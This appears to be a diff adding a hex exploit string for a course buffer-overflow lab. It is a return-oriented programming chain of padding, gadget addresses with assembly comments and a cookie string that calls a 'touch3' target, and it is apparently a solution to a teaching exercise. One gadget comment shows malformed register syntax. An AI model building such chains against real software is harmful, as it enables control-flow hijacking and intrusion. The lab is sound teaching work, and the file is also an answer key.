@@ -1,0 +1,17 @@
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */
+a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */
+cc 19 40 00 00 00 00 00 /* popq %rax; nop; */
+48 00 00 00 00 00 00 00 /* %rdi + 0x48 will point to the cookie string */
+dd 19 40 00 00 00 00 00 /* movl %eax,%edx; nop; */
+69 1a 40 00 00 00 00 00 /* movl %edx,%ecx; orb %db,%db; */
+13 1a 40 00 00 00 00 00 /* movl %rcx,%rsi */
+d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* touch3 */
+35 39 62 39 39 37 66 61 /* cookie */
+00
